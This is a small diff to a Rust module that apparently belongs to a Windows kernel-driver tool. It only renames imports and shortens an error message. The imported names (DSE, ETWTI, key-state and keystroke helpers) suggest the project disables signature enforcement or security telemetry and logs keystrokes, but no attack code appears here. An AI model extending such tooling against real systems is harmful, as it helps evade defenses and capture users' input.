@@ -1,6 +1,6 @@
 use {
-    log::*,
-    shared::structs::{DSE, ETWTI},
+    log::{info, debug, error},
+    common::structs::{DSE, ETWTI},
     crate::utils::{
         vk_to_char, update_key_state, key_pressed,
         get_process_by_name, open_driver,
@@ -33,7 +33,7 @@ pub struct Misc {
 
 impl Misc {
     pub fn new() -> Self {
-        let driver_handle = open_driver().expect("Failed to open driver");
+        let driver_handle = open_driver().expect("Error");
         Misc { driver_handle }
     }
 
